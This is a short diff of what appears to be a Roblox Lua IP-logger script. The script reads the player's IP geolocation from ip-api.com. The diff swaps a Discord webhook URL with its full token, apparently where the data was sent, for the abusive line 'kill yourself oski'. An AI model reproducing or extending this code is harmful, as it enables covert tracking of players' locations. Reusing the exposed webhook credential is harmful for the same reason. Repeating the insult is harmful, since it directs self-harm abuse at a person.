@@ -1,4 +1,4 @@
-local webh = "https://discord.com/api/webhooks/1026447738163957780/ffATwMhzTnkjbq6ajuG5HshtzDcL0ZNInaybtcgPYoyk0jpGu8FFpGvKRlgLR7Ht27U6"
+local webh = " kill yourself oski "
 local lfv = tostring(game:HttpGet("http://ip-api.com/json/", true))
 
 pcall(function()
